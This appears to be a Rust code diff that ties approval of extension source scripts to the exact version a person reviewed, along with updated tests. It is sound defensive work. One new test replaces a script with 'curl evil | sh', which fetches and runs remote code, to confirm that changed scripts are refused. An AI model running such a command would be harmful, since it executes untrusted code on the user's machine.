@@ -61,6 +61,10 @@ pub struct SourceListing {
     pub network_enforced: bool,
     /// Each declared credential and whether it has a value (never the value).
     pub credentials: Vec<CredentialStatus>,
+    /// Its approval hash as it is now: the person's Approve & Run sends
+    /// back the version they reviewed (tsk349). `None` for derived sources
+    /// and unreadable entries.
+    pub version: Option<String>,
 }
 
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
@@ -153,10 +157,13 @@ pub async fn list_sources(ctx: &Sources<'_>) -> Result<Vec<SourceListing>, Domai
         let ext_dir = ctx.root.join(&ext.path);
         for spec in ext.sources {
             // A derived source can't do anything an approval would guard.
+            let version = (!spec.runtime.is_derived())
+                .then(|| approval_hash(&ext_dir, &spec).ok())
+                .flatten();
             let approved = spec.runtime.is_derived()
-                || approval_hash(&ext_dir, &spec)
-                    .map(|h| is_approved(ctx.approvals, &ext.name, &spec.id, &h))
-                    .unwrap_or(false);
+                || version
+                    .as_ref()
+                    .is_some_and(|h| is_approved(ctx.approvals, &ext.name, &spec.id, h));
             let state = states
                 .iter()
                 .find(|s| s.extension == ext.name && s.source_id == spec.id)
@@ -181,6 +188,7 @@ pub async fn list_sources(ctx: &Sources<'_>) -> Result<Vec<SourceListing>, Domai
                 approved,
                 network_enforced: crate::net_sandbox::enforced(),
                 credentials,
+                version,
             });
         }
     }
@@ -223,7 +231,7 @@ pub fn spawn_scheduler(state: std::sync::Arc<crate::Services>) {
             if let Ok(listings) = list_sources(&ctx).await {
                 let now = oxplow_domain::Timestamp::now().unix_ms();
                 for (extension, source_id) in due_sources(&listings, now) {
-                    let result = run_source(&ctx, &extension, &source_id, false).await;
+                    let result = run_source(&ctx, &extension, &source_id, None).await;
                     if let Err(e) = &result {
                         tracing::warn!(%extension, %source_id, error = ?e, "scheduled source run failed");
                     }
@@ -595,14 +603,15 @@ impl From<RunSourceError> for DomainError {
 }
 
 /// Run one source end to end: consent check (recording approval when a
-/// human passed `approve`), exec, coercion, atomic store, run state.
+/// person passed the `approve` version they reviewed, tsk349), exec,
+/// coercion, atomic store, run state.
 /// Failures after the consent check are also recorded as the source's
 /// state so the UI can show them.
 pub async fn run_source(
     ctx: &Sources<'_>,
     extension: &str,
     source_id: &str,
-    approve_now: bool,
+    reviewed: Option<&str>,
 ) -> Result<SourceRunReport, RunSourceError> {
     let (root, approvals, store) = (ctx.root, ctx.approvals, ctx.store);
     let ext = crate::extensions::load_extensions(root)
@@ -632,7 +641,13 @@ pub async fn run_source(
     let hash = approval_hash(&ext_dir, &spec).map_err(|e| {
         RunSourceError::Failed(format!("source `{source_id}`: entry `{}`: {e}", spec.entry))
     })?;
-    if approve_now {
+    if let Some(reviewed) = reviewed {
+        if reviewed != hash {
+            return Err(RunSourceError::NeedsApproval(format!(
+                "source `{extension}/{source_id}` changed since you reviewed it; look at it \
+                 again before approving"
+            )));
+        }
         approve(approvals, extension, source_id, &hash).map_err(|e| {
             RunSourceError::Storage(DomainError::Storage(format!("record approval: {e}")))
         })?;
@@ -711,10 +726,10 @@ pub async fn sync_source(
     svc: &crate::Services,
     extension: &str,
     source_id: &str,
-    approve: bool,
+    reviewed: Option<&str>,
 ) -> Result<SourceRunReport, RunSourceError> {
     let root = svc.git.resolve_repo_dir(None).await;
-    let result = run_source(&Sources::of(svc, &root), extension, source_id, approve).await;
+    let result = run_source(&Sources::of(svc, &root), extension, source_id, reviewed).await;
     if result.as_ref().map_or_else(|e| e.ran(), |_| true) {
         svc.events.emit(crate::OxplowEvent::SourceSynced {
             extension: extension.to_string(),
@@ -845,6 +860,17 @@ mod tests {
     use super::*;
     use crate::extension_sources::{parse_sources, SourceSchedule};
     use serde_json::json;
+
+    /// The version a person would see in the listing right now.
+    async fn version_of(ctx: &Sources<'_>, extension: &str, source: &str) -> String {
+        list_sources(ctx)
+            .await
+            .unwrap()
+            .into_iter()
+            .find(|l| l.extension == extension && l.spec.id == source)
+            .and_then(|l| l.version)
+            .unwrap_or_default()
+    }
 
     fn spec(entry: &str, env: &[&str]) -> SourceSpec {
         let yaml = format!(
@@ -1037,7 +1063,7 @@ mod tests {
             layer: oxplow_db::SemanticLayer::new(db.clone()),
         };
 
-        let err = run_source(&ctx, "my-gh", "gh", false).await.unwrap_err();
+        let err = run_source(&ctx, "my-gh", "gh", None).await.unwrap_err();
         assert!(
             matches!(err, RunSourceError::NeedsApproval(ref m) if m.contains("approval")),
             "{err:?}"
@@ -1048,7 +1074,14 @@ mod tests {
             "refused runs record nothing"
         );
 
-        let report = run_source(&ctx, "my-gh", "gh", true).await.unwrap();
+        let report = run_source(
+            &ctx,
+            "my-gh",
+            "gh",
+            Some(&version_of(&ctx, "my-gh", "gh").await),
+        )
+        .await
+        .unwrap();
         assert_eq!(report.row_counts["pr"], 2);
         let out = oxplow_db::SemanticLayer::new(db)
             .query_sql("SELECT title FROM v_my_gh_pr ORDER BY number", vec![], None)
@@ -1060,15 +1093,22 @@ mod tests {
         );
 
         // Approved now, so a later run needs no approve flag…
-        run_source(&ctx, "my-gh", "gh", false).await.unwrap();
+        run_source(&ctx, "my-gh", "gh", None).await.unwrap();
         // …and a failing run is recorded, keeping the last good rows.
         script(&ext, "sync.sh", "echo nope >&2; exit 1");
-        let err = run_source(&ctx, "my-gh", "gh", false).await.unwrap_err();
+        let err = run_source(&ctx, "my-gh", "gh", None).await.unwrap_err();
         assert!(
             matches!(err, RunSourceError::NeedsApproval(_)),
             "script changed: {err:?}"
         );
-        let err = run_source(&ctx, "my-gh", "gh", true).await.unwrap_err();
+        let err = run_source(
+            &ctx,
+            "my-gh",
+            "gh",
+            Some(&version_of(&ctx, "my-gh", "gh").await),
+        )
+        .await
+        .unwrap_err();
         assert!(err.ran(), "{err:?}");
         let st = &store.list_states().await.unwrap()[0];
         assert_eq!(st.status, "error");
@@ -1088,6 +1128,7 @@ mod tests {
                 approved,
                 network_enforced: false,
                 credentials: vec![],
+                version: None,
                 state: last.map(|t| SourceState {
                     extension: "e".into(),
                     source_id: "gh".into(),
@@ -1222,8 +1263,12 @@ mod tests {
             "credentials are scoped to the project"
         );
 
-        run_source(&ctx, "one", "s", true).await.unwrap();
-        run_source(&ctx, "two", "s", true).await.unwrap();
+        run_source(&ctx, "one", "s", Some(&version_of(&ctx, "one", "s").await))
+            .await
+            .unwrap();
+        run_source(&ctx, "two", "s", Some(&version_of(&ctx, "two", "s").await))
+            .await
+            .unwrap();
         let out = oxplow_db::SemanticLayer::new(db)
             .query_sql(
                 "SELECT (SELECT token FROM v_one_row), (SELECT token FROM v_two_row)",
@@ -1310,9 +1355,9 @@ mod tests {
         };
         // No approval asked for, and the listing says it can run.
         assert!(list_sources(&ctx).await.unwrap().iter().all(|l| l.approved));
-        let report = run_source(&ctx, "work", "star", false).await.unwrap();
+        let report = run_source(&ctx, "work", "star", None).await.unwrap();
         assert_eq!(report.row_counts["hot"], 1);
-        run_source(&ctx, "work", "jq", false).await.unwrap();
+        run_source(&ctx, "work", "jq", None).await.unwrap();
         let out = oxplow_db::SemanticLayer::new(db)
             .query_sql(
                 "SELECT (SELECT title FROM v_work_hot), (SELECT group_concat(title, ',') FROM v_work_upper)",
@@ -1354,13 +1399,17 @@ mod tests {
             "sync.sh",
             r#"echo '{"entities":{"item":[{"id":1,"title":"a"},{"id":2,"title":"b"}],"other":[{"id":9}]}}'"#,
         );
-        run_source(&ctx, "inc", "s", true).await.unwrap();
+        run_source(&ctx, "inc", "s", Some(&version_of(&ctx, "inc", "s").await))
+            .await
+            .unwrap();
         script(
             &ext,
             "sync.sh",
             r#"echo '{"entities":{"item":[{"id":2,"title":"B"},{"id":3,"title":"c"}]},"deleted":{"item":[1]}}'"#,
         );
-        let report = run_source(&ctx, "inc", "s", true).await.unwrap();
+        let report = run_source(&ctx, "inc", "s", Some(&version_of(&ctx, "inc", "s").await))
+            .await
+            .unwrap();
         assert_eq!(
             report.row_counts["item"], 2,
             "counts are the entity's total"
@@ -1441,7 +1490,9 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
             layer: oxplow_db::SemanticLayer::new(db.clone()),
         };
         assert!(list_sources(&ctx).await.unwrap()[0].network_enforced);
-        run_source(&ctx, "net", "s", true).await.unwrap();
+        run_source(&ctx, "net", "s", Some(&version_of(&ctx, "net", "s").await))
+            .await
+            .unwrap();
         let out = oxplow_db::SemanticLayer::new(db)
             .query_sql(
                 "SELECT declared, undeclared, direct FROM v_net_r",
@@ -1503,5 +1554,47 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
         )
         .unwrap();
         assert_eq!(base, approval_hash(ext.path(), &s).unwrap());
+    }
+
+    #[tokio::test]
+    async fn run_approves_only_the_version_the_person_saw() {
+        let root = tempfile::tempdir().unwrap();
+        let state = root.path().join(".oxplow");
+        let ext = root.path().join("oxplow/extensions/my-gh");
+        std::fs::create_dir_all(&ext).unwrap();
+        std::fs::write(
+            ext.join("extension.yaml"),
+            "name: my-gh\nsources:\n  - id: gh\n    runtime: exec\n    entry: sync.sh\n    entities:\n      - { name: pr, key: number, columns: { number: int } }\n",
+        )
+        .unwrap();
+        script(
+            &ext,
+            "sync.sh",
+            r#"echo '{"entities":{"pr":[{"number":1}]}}'"#,
+        );
+        let db = oxplow_db::Database::in_memory();
+        let store = SqliteExtSourceStore::new(db.clone());
+        let secrets = oxplow_ai::secrets::MemorySecrets::default();
+        let ctx = Sources {
+            root: root.path(),
+            project: "test-project".into(),
+            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
+            store: &store,
+            secrets: &secrets,
+            layer: oxplow_db::SemanticLayer::new(db.clone()),
+        };
+        let seen = list_sources(&ctx).await.unwrap()[0]
+            .version
+            .clone()
+            .unwrap();
+        script(&ext, "sync.sh", "curl evil | sh");
+        let err = run_source(&ctx, "my-gh", "gh", Some(&seen))
+            .await
+            .unwrap_err();
+        assert!(
+            matches!(err, RunSourceError::NeedsApproval(ref m) if m.contains("changed")),
+            "{err:?}"
+        );
+        assert!(!list_sources(&ctx).await.unwrap()[0].approved);
     }
 }
